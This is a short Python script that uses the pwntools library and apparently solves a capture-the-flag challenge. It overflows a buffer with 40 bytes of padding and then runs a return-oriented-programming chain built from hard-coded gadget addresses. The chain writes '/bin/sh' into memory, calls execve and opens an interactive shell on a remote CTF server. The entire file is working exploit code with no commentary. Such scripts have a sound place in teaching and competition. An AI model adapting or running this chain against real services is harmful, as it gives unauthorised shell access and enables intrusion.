#!/usr/bin/env python
from pwn import *

context.arch = "amd64"

pop_rdi = 0x0000000000401456
pop_rsi = 0x0000000000401577
mov_qrdi_rsi = 0x000000000047a502
pop_rax_rdx_rbx = 0x0000000000478516
syscall = 0x00000000004671b5
buf = 0x6c9a20

payload = "A" * 40
rop = flat([pop_rdi, buf, pop_rsi, "/bin/sh\x00", mov_qrdi_rsi, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, syscall])

r = remote("csie.ctf.tw", 10130)
r.sendafter(':', payload + rop)
r.interactive()
